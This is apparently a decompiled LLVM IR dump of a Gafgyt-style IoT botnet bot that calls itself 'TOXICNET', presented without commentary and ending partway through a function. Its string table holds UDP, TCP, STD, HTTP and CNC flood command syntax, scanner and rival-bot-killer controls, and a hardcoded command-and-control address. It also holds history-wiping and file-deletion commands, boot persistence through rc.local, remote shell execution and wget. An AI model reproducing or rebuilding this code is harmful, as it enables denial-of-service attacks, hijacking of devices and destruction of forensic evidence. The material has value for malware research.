@global_var_10014d40.381 = constant [4 x i8] c"sh4\00"
@global_var_10014d44.382 = constant [4 x i8] c"x86\00"
@global_var_10014d48.383 = constant [5 x i8] c"i686\00"
@global_var_10014d50.384 = constant [4 x i8] c"ppc\00"
@global_var_10014d54.385 = constant [5 x i8] c"i586\00"
@global_var_10014d5c.386 = constant [8 x i8] c"jackmy*\00"
@global_var_10014d64.387 = constant [8 x i8] c"hackmy*\00"
@global_var_10014d6c.388 = constant [5 x i8] c"arm*\00"
@global_var_10014d74.389 = constant [3 x i8] c"b1\00"
@global_var_10014d78.390 = constant [3 x i8] c"b2\00"
@global_var_10014d7c.391 = constant [3 x i8] c"b3\00"
@global_var_10014d80.392 = constant [3 x i8] c"b4\00"
@global_var_10014d84.393 = constant [3 x i8] c"b5\00"
@global_var_10014d88.394 = constant [3 x i8] c"b6\00"
@global_var_10014d8c.395 = constant [3 x i8] c"b7\00"
@global_var_10014d90.396 = constant [3 x i8] c"b8\00"
@global_var_10014d94.397 = constant [3 x i8] c"b9\00"
@global_var_10014d98.398 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_10014dac.399 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_10014db8.400 = constant [10 x i8] c"dvrHelper\00"
@global_var_10014dc4.401 = constant [8 x i8] c"FDFDHFC\00"
@global_var_10014dcc.402 = constant [5 x i8] c"FEUB\00"
@global_var_10014dd4.403 = constant [9 x i8] c"FTUdftui\00"
@global_var_10014de0.404 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_10014dec.405 = constant [6 x i8] c"jhUOH\00"
@global_var_10014df4.406 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_10014e00.407 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_10014e0c.408 = constant [10 x i8] c"kmyx86_64\00"
@global_var_10014e18.409 = constant [10 x i8] c"lolmipsel\00"
@global_var_10014e24.410 = constant [8 x i8] c"RYrydry\00"
@global_var_10014e2c.411 = constant [5 x i8] c"tel*\00"
@global_var_10014e34.412 = constant [9 x i8] c"TwoFace*\00"
@global_var_10014e40.413 = constant [9 x i8] c"UYyuyioy\00"
@global_var_10014e4c.414 = constant [5 x i8] c"wget\00"
@global_var_10014e54.415 = constant [7 x i8] c"x86_64\00"
@global_var_10014e5c.416 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_10014e68.417 = constant [5 x i8] c"xxb*\00"
@global_var_10014e74.418 = constant i32 822083584
@global_var_10014e78.419 = constant i32 838860800
@global_var_10014e7c.420 = constant i32 855638016
@global_var_10014e80.421 = constant i32 872415232
@global_var_10014e84.422 = constant i32 889192448
@global_var_10014e88.423 = constant i32 905969664
@global_var_10014e8c.424 = constant i32 922746880
@global_var_10014e90.425 = constant i32 939524096
@global_var_10014e94.426 = constant i32 956301312
@global_var_10014e98.427 = constant [3 x i8] c"10\00"
@global_var_10014e9c.428 = constant [3 x i8] c"11\00"
@global_var_10014ea0.429 = constant [3 x i8] c"12\00"
@global_var_10014ea4.430 = constant [3 x i8] c"13\00"
@global_var_10014ea8.431 = constant [3 x i8] c"14\00"
@global_var_10014eac.432 = constant [3 x i8] c"15\00"
@global_var_10014eb0.433 = constant [3 x i8] c"16\00"
@global_var_10014eb4.434 = constant [3 x i8] c"17\00"
@global_var_10014eb8.435 = constant [3 x i8] c"18\00"
@global_var_10014ebc.436 = constant [3 x i8] c"19\00"
@global_var_10014ec0.437 = constant [3 x i8] c"20\00"
@global_var_10014ec4.438 = constant [6 x i8] c"hackz\00"
@global_var_10014ecc.439 = constant [5 x i8] c"bin*\00"
@global_var_10014ed4.440 = constant [5 x i8] c"gtop\00"
@global_var_10014edc.441 = constant [5 x i8] c"ftp*\00"
@global_var_10014ee4.442 = constant [6 x i8] c"tftp*\00"
@global_var_10014eec.443 = constant [7 x i8] c"botnet\00"
@global_var_10014ef4.444 = constant [8 x i8] c"swatnet\00"
@global_var_10014efc.445 = constant [8 x i8] c"ballpit\00"
@global_var_10014f04.446 = constant [8 x i8] c"fucknet\00"
@global_var_10014f0c.447 = constant [9 x i8] c"cracknet\00"
@global_var_10014f18.448 = constant [8 x i8] c"weednet\00"
@global_var_10014f20.449 = constant [7 x i8] c"gaynet\00"
@global_var_10014f28.450 = constant [9 x i8] c"queernet\00"
@global_var_10014f34.451 = constant [8 x i8] c"ballnet\00"
@global_var_10014f3c.452 = constant [5 x i8] c"unet\00"
@global_var_10014f44.453 = constant [7 x i8] c"yougay\00"
@global_var_10014f4c.454 = constant [7 x i8] c"sttftp\00"
@global_var_10014f54.455 = constant [7 x i8] c"sstftp\00"
@global_var_10014f5c.456 = constant [7 x i8] c"sbtftp\00"
@global_var_10014f64.457 = constant [6 x i8] c"btftp\00"
@global_var_10014f6c.458 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_10014f78.459 = constant [6 x i8] c"bruv*\00"
@global_var_10014f80.460 = constant [5 x i8] c"IoT*\00"
@global_var_1002824c.461 = global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014d30.379, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014d38.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014d40.381, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014d44.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014d48.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014d50.384, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014d54.385, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014d54.385, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014d5c.386, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014d64.387, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014d6c.388, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d74.389, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d78.390, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d7c.391, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d80.392, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d84.393, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d88.394, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d8c.395, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d90.396, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014d94.397, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10014d98.398, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014dac.399, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014db8.400, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014dc4.401, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014dcc.402, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014dd4.403, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014de0.404, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014dec.405, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014df4.406, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014e00.407, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014e0c.408, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014e18.409, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014d30.379, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014d38.380, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014e24.410, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014e2c.411, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014e34.412, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014e40.413, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014e4c.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014e54.415, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014e5c.416, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014e68.417, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014e70.19, i32 0, i32 0), i8* bitcast (i32* @global_var_10014e74.418 to i8*), i8* bitcast (i32* @global_var_10014e78.419 to i8*), i8* bitcast (i32* @global_var_10014e7c.420 to i8*), i8* bitcast (i32* @global_var_10014e80.421 to i8*), i8* bitcast (i32* @global_var_10014e84.422 to i8*), i8* bitcast (i32* @global_var_10014e88.423 to i8*), i8* bitcast (i32* @global_var_10014e8c.424 to i8*), i8* bitcast (i32* @global_var_10014e90.425 to i8*), i8* bitcast (i32* @global_var_10014e94.426 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014e98.427, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014e9c.428, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014ea0.429, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014ea4.430, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014ea8.431, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014eac.432, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014eb0.433, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014eb4.434, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014eb8.435, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014ebc.436, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10014ec0.437, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014ec4.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014ecc.439, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014ed4.440, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014edc.441, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014ee4.442, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014eec.443, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014ef4.444, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014efc.445, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014f04.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014f0c.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014f18.448, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014f20.449, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014f28.450, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10014f34.451, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014f3c.452, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014f44.453, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014f4c.454, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014f54.455, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014f5c.456, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014f64.457, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014f6c.458, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014f78.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10014f80.460, i32 0, i32 0)]
@global_var_10016568.466 = constant i32 570425344
@global_var_1001656c.467 = constant [22 x i8] c"history -c;history -w\00"
@global_var_10016584.468 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_100165a4.469 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_100165e4.470 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_10016624.471 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_10016664.472 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_100166f4.473 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1001672c.474 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1001674c.475 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_10016764.476 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_100165bc.484 = constant [6 x i8] c"close\00"
@global_var_100165c4.485 = constant [11 x i8] c"keep-alive\00"
@global_var_100165d0.486 = constant [7 x i8] c"accept\00"
@global_var_100167d8.490 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10009f18.491 = constant i32 939524096
@global_var_10009f90.492 = constant [3 x i8] c"8`\00"
@global_var_10016834.500 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_1000a0f8.501 = constant i32 1207969477
@global_var_1000a174.502 = constant [3 x i8] c"8`\00"
@global_var_1000a264.503 = constant [3 x i8] c"8`\00"
@global_var_1000a274.504 = constant [3 x i8] c"8`\00"
@global_var_10016874.505 = constant [6 x i8] c"PONG!\00"
@global_var_1000a314.506 = constant i32 1207963912
@global_var_1001687c.507 = constant [6 x i8] c"TABLE\00"
@global_var_10016884.508 = constant [3 x i8] c"%d\00"
@global_var_1000a364.509 = constant i32 1207963832
@global_var_10016888.510 = constant [8 x i8] c"SCANNER\00"
@global_var_10016890.511 = constant [4 x i8] c"OFF\00"
@global_var_10028800.512 = local_unnamed_addr global i32 0
@global_var_10016894.513 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_100168a8.514 = constant [3 x i8] c"ON\00"
@global_var_100168ac.515 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_1000a4c8.516 = constant [3 x i8] c"8`\00"
@global_var_100168c8.517 = constant [8 x i8] c"REMOVER\00"
@global_var_100168d0.518 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_1000a544.519 = constant [3 x i8] c"8`\00"
@global_var_100168f0.520 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_100168fc.521 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_1000a5ac.522 = constant i32 1207963248
@global_var_10016910.523 = constant [4 x i8] c"UDP\00"
@global_var_10016914.524 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1000a724.525 = constant i32 1207962872
@global_var_1000a8cc.526 = constant [3 x i8] c"8`\00"
@global_var_1000a8d4.527 = constant [3 x i8] c"8`\00"
@global_var_1000a930.528 = constant [3 x i8] c"8`\00"
@global_var_10016988.529 = constant [4 x i8] c"TCP\00"
@global_var_1001698c.530 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1000aa68.531 = constant i32 1207962036
@global_var_1000abbc.532 = constant [3 x i8] c"8`\00"
@global_var_1000abc4.533 = constant [3 x i8] c"8`\00"
@global_var_1000ac1c.534 = constant [3 x i8] c"8`\00"
@global_var_10016a48.535 = constant [5 x i8] c"HTTP\00"
@global_var_1000ad48.536 = constant [3 x i8] c"8`\00"
@global_var_1000ad50.537 = constant [3 x i8] c"8`\00"
@global_var_1000ae20.538 = constant [3 x i8] c"8`\00"
@global_var_10016a50.539 = constant [10 x i8] c"HTTPFLOOD\00"
@global_var_1000af44.540 = constant [3 x i8] c"8`\00"
@global_var_10016a5c.541 = constant [4 x i8] c"CNC\00"
@global_var_10016a60.542 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_1000afd8.543 = constant i32 1207960644
@global_var_1000b090.544 = constant [3 x i8] c"8`\00"
@global_var_1000b098.545 = constant [3 x i8] c"8`\00"
@global_var_1000b0e0.546 = constant [3 x i8] c"8`\00"
@global_var_10016a7c.547 = constant [4 x i8] c"STD\00"
@global_var_10016a80.548 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1000b174.549 = constant i32 1207960232
@global_var_1000b21c.550 = constant [3 x i8] c"8`\00"
@global_var_1000b224.551 = constant [3 x i8] c"8`\00"
@global_var_1000b26c.552 = constant [3 x i8] c"8`\00"
@global_var_10016a9c.553 = constant [9 x i8] c"KILLATTK\00"
@global_var_10016aa8.554 = constant [11 x i8] c"Killed %d.\00"
@global_var_1000b3d0.555 = constant i32 1207959584
@global_var_10016ab4.556 = constant [13 x i8] c"None Killed.\00"
@global_var_10016ac4.557 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_1002878c.558 = local_unnamed_addr global i32 -1
@global_var_10014f88.559 = constant [16 x i8] c"208.67.1.179:23\00"
@global_var_10028788.560 = global [16 x i8]* @global_var_10014f88.559
@global_var_1000b500.561 = constant i32 939524119
@global_var_10016ad0.562 = constant [8 x i8] c"8.8.8.8\00"
@global_var_10016ad8.563 = constant [16 x i8] c"/proc/net/route\00"
@global_var_10016ae8.564 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000b804.565 = constant i32 939524096
@global_var_100287e0.566 = global i32 0
@global_var_1000b858.567 = constant i32 1207959564
@global_var_10016af4.568 = constant [9 x i8] c"TOXICNET\00"
@global_var_10016b00.569 = constant i32 0
@global_var_1000b93c.570 = constant [3 x i8] c"8`\00"
@global_var_1000b95c.571 = constant [3 x i8] c"8`\00"
@global_var_1000b97c.572 = constant i32 939524096
@global_var_10016b04.573 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1912602624
@global_var_10016b1c.575 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_10016b2c.576 = constant i32 788529152
@global_var_10016b30.577 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1000ba98.578 = constant i32 1207959620
@global_var_10016b38.579 = constant i32 1627389952
@global_var_1000bb40.580 = constant i32 1207959576
@global_var_1000bb4c.581 = constant i32 1207959564
@global_var_1000bb5c.582 = constant i32 1207962721
@global_var_1000bb88.583 = constant [3 x i8] c"8`\00"
@global_var_10016b3c.584 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1000bbdc.585 = constant i32 1207959576
@global_var_1000bbf4.586 = constant i32 1207963621
@global_var_1000bc04.587 = constant [3 x i8] c"8`\00"
@global_var_1000bc10.588 = constant i32 1207959556
@global_var_10016b4c.589 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_1000bc78.590 = constant i32 939524096
@global_var_10016b58.591 = constant [5 x i8] c"PONG\00"
@global_var_1000bfbc.592 = constant i32 1207960788
@global_var_10016b60.593 = constant [4 x i8] c"DUP\00"
@global_var_10016b64.594 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_10016b78.595 = constant [3 x i8] c"SH\00"
@global_var_10016b7c.596 = constant [8 x i8] c"%s 2>&1\00"
@global_var_10016b84.597 = constant [3 x i8] c"%s\00"
@global_var_1000c2d4.598 = constant [3 x i8] c"8`\00"
@global_var_1000c304.599 = constant [3 x i8] c"8`\00"
@global_var_1000c30c.600 = constant i32 939524097
@global_var_10016b88.601 = constant i32 536870912
@global_var_1000c548.602 = constant i32 1207959564
@global_var_1000c8e4.603 = constant i32 1207959560
@global_var_10028820.604 = local_unnamed_addr global i32 0
@global_var_1000cc54.605 = constant i32 939524118
@global_var_10028798 = external local_unnamed_addr global i32
@global_var_10028830.606 = global i32 0
@global_var_1001104c.607 = constant [3 x i8] c"8`\00"
@global_var_10028478.608 = global i32 0
@global_var_10028808.609 = local_unnamed_addr global i32 0
@global_var_1002880c.610 = local_unnamed_addr global i32 0
@global_var_1000cea4.611 = constant i32 1207965629
@global_var_1000d08c.612 = constant i32 1207960120
@global_var_100287bc.613 = local_unnamed_addr global i32 2
@global_var_10028460.614 = global i32 0
@global_var_100287b8.615 = global i32* bitcast (i16* @global_var_10028490.310 to i32*)
@global_var_1000d2c0.616 = constant i32 1207959560
@global_var_1000d310.617 = constant [3 x i8] c" c\00"
@global_var_1000d32c.618 = constant [3 x i8] c" c\00"
@global_var_1001718c.619 = constant i32 0
@global_var_1000d5c8.620 = constant i32 1207961092
@global_var_1000d6f4.621 = constant i32 1207960768
@global_var_100171c0.622 = constant i32 269488136
@global_var_100171a4.623 = constant [6 x i8] c"(nil)\00"
@global_var_100171ac.624 = constant [7 x i8] c"(null)\00"
@global_var_100171b4.625 = constant i32 721431808
@global_var_1000db50.626 = constant i32 939524096
@global_var_10017240.627 = constant i32 65793
@global_var_10017228.628 = constant i32 524293
@global_var_10017220.629 = constant [8 x i8] c" +0-#'I\00"
@global_var_100171c8.630 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10017208.631 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_100171fc.632 = constant i32 67343
@global_var_100171fb.633 = constant i32 50331911
@global_var_100171ec.634 = constant i32 268435461
@global_var_100171dc.635 = constant i32 520093701
@global_var_1000e50c.636 = constant [3 x i8] c"8a\00"
@global_var_1000e834.637 = constant i32 1207959708
@global_var_1000e8dc.638 = constant i32 1207959612
@global_var_1000ea28.639 = constant i32 939589631
@global_var_1000eadc.640 = constant i32 939524118
@global_var_1001725c.641 = constant [8 x i8] c"Success\00"
@global_var_1001724c.642 = constant [15 x i8] c"Unknown error \00"
@global_var_10017efa.643 = constant i32 1
@global_var_100287cc.644 = local_unnamed_addr global i32* @global_var_10017efa.643
@global_var_10028810.645 = global i32 0
@global_var_1002e870.646 = global i32 0
@global_var_1002ea4c.647 = global i32 0
@global_var_1002e880.648 = global i32 0
@global_var_10028758.649 = global i32 0
@global_var_1002883c.650 = local_unnamed_addr global i32 0
@global_var_1002eb38.651 = global i32 0
@global_var_1000f878.652 = constant [3 x i8] c"8`\00"
@global_var_1000f95c.653 = constant i32 939524098
@global_var_1000f99c.654 = constant [3 x i8] c"8`\00"
@global_var_1000fba4.655 = constant i32 939524118
@global_var_1000fc2c.656 = constant i32 939524118
@global_var_1002ea90.657 = global i32 0
@global_var_1002ea60.658 = global i32 0
@global_var_100287c0 = external global i32
@global_var_1002eb10.661 = global i32 0
@global_var_1000fe88.662 = constant i32 939524108
@global_var_1000ff20.663 = constant [3 x i8] c"8`\00"
@global_var_1000ffcc.664 = constant [3 x i8] c"8`\00"
@global_var_100102f4.665 = constant i32 1207959640
@global_var_10010330.666 = constant i32 1207959580
@global_var_10028688.667 = global i32 0
@global_var_100286a0 = external global i32
@global_var_100286c0.669 = global i32 -1726662223
@global_var_100286a8.670 = local_unnamed_addr global i32* @global_var_100286c0.669
@global_var_100286a4.671 = global i32* @global_var_100286c0.669
@global_var_10017db8.672 = constant i32 0
@global_var_10010648.673 = constant i32 939524118
@global_var_10017de0.674 = constant [8 x i8] c"/bin/sh\00"
@global_var_10017de8.675 = constant [3 x i8] c"sh\00"
@global_var_10017dec.676 = constant [3 x i8] c"-c\00"
@global_var_1001099c.677 = constant [3 x i8] c"8`\00"
@global_var_10010bb0.678 = constant i32 939524130
@global_var_1002873c.679 = global i32 0
@global_var_10028814.680 = local_unnamed_addr global i32 0
@global_var_10010c44.681 = constant i32 1207960437
@global_var_1002881c.682 = local_unnamed_addr global i32 0
@global_var_1002822c.683 = global i32 -1
@global_var_10028824.684 = local_unnamed_addr global i32 0
@global_var_10028828.685 = local_unnamed_addr global i32 0
@global_var_10017df0.686 = constant [10 x i8] c"/dev/null\00"
@global_var_1002882c.687 = local_unnamed_addr global i32 0
@global_var_10028818.688 = local_unnamed_addr global i32 0
@global_var_10011364.689 = constant i32 939524096
@global_var_10011380.690 = constant i32 939524096
@global_var_10028850.691 = local_unnamed_addr global i32 0
@global_var_10028834.692 = global i32 0
@global_var_1001173c.693 = constant i32 939524180
@global_var_10011a58.694 = constant i32 939524105
@global_var_10018128.695 = constant [4 x i8] c"inf\00"
@global_var_1001812b.697 = constant i32 4804166
@global_var_10018138.698 = constant i32 771763200
@global_var_1002ea78.700 = global i32 0
@global_var_10028838.701 = local_unnamed_addr global i32 0
@global_var_10012a0c.703 = constant i32 1207960848
@global_var_10028840.704 = local_unnamed_addr global i32 0
@global_var_10018188.705 = constant i32 771751936
@global_var_1002eb28.706 = global i32 0
@global_var_10012afc.707 = constant [3 x i8] c"8a\00"
@global_var_10012b08.708 = constant i32 939524097
@global_var_10012bdc.709 = constant i32 939524097
@global_var_10012cb0.710 = constant i32 939524097
@global_var_10012cdc.711 = constant i32 939524100
@global_var_10012dbc.712 = constant i32 1207959684
@global_var_10012f38.713 = constant i32 939589631
@global_var_100181a4.714 = constant i32 1912602624
@global_var_10018190.715 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_100181a8.716 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_100181c0.717 = constant [11 x i8] c"nameserver\00"
@global_var_100181cc.718 = constant [7 x i8] c"domain\00"
@global_var_100181d4.719 = constant [7 x i8] c"search\00"
@global_var_10013270.720 = constant i32 1207959568
@global_var_10013278.721 = constant i32 939524099
@global_var_10028770.722 = global i32 0
@global_var_100133d8.723 = constant i32 939524129
@global_var_10028844.724 = local_unnamed_addr global i32 0
@global_var_1001344c.725 = constant [3 x i8] c"8`\00"
@global_var_10013484.726 = constant i32 939524129
@global_var_10028848.727 = local_unnamed_addr global i32 0
@global_var_1002884c.728 = local_unnamed_addr global i32 0
@global_var_10013860.729 = constant i32 939524171
@global_var_10013910.730 = constant i32 939524105
@global_var_10013cac.731 = constant [3 x i8] c"8`\00"
@global_var_100181f0.732 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10013ea4.733 = constant [3 x i8] c"9 \00"
@global_var_10013eb0.734 = constant i32 939524193
@global_var_10013f18.736 = constant i32 939524101
@global_var_10014004.737 = constant i32 939524124
@global_var_1001407c.738 = constant i32 1207960116
@global_var_10014094.739 = constant i32 939524105
@global_var_1001420c.740 = constant [3 x i8] c"9 \00"
@global_var_10018204.741 = constant [3 x i8] c"%x\00"
@global_var_10014298.742 = constant i32 939524124
@global_var_100142bc.743 = constant i32 939524193
@global_var_10018208.744 = constant [11 x i8] c"/etc/hosts\00"
@global_var_10018214.745 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_100149a8.746 = constant i32 1207959560
@global_var_10014a40.747 = constant i32 939589631
@global_var_10028230.748 = global i32 0
@global_var_10028854.1 = local_unnamed_addr global i8 0
@global_var_100287eb.54 = local_unnamed_addr global i8 0
@global_var_100287ec.55 = local_unnamed_addr global i8 0
@global_var_10028490.310 = global i16 288
@global_var_100284e0.311 = global i16 272
@global_var_10028754.702 = local_unnamed_addr global i16 1
@global_var_10016b18.574 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_10028854.1, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_10028244.3 to i32*), align 4
